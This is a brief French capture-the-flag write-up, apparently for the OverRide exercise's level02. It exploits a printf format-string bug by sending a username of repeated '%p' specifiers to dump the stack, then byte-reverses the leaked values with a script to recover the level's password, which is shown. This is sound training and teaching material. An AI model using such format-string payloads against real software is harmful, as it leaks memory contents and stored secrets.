## Le programme

Le programme lis le fichier .pass et prend en input du stdin un username et un mot de passe. Si le mot de passe est faux, il utilise printf pour afficher le username. On peut exploiter ce printf pour afficher les valeurs de la stack, qui contient le contenu de .pass.

## La faille

Il suffit donc de print assez d'adresses sur la stack pour pouvoir voir le contenu de `.pass`.

```
level02@OverRide:~$ ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
--[ Password: s
*****************************************
0x7fffffffe410 (nil) 0x73 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe608 0x1f7ff9a08 0x73 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 does not have access!
```

Il suffit maintenant de récupérer les adresses print de la stack et de les donner au programme que nous avons developpé qui permet de normaliser les adresses et de les reverse octet par octet.


```
python3 reverse.py --addresses "0x7fffffffe410 (nil) 0x73 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe608 0x1f7ff9a08 0x73 (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) (nil) 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520"
 %p %p %%p %p %pp %p %p  %p %p %%p %p %p........M9KfPg3HsXGnh5J5XgNWCqz7Q9sa5JAEHh74RPnu........................................................................................................s.......................****************s.......................
```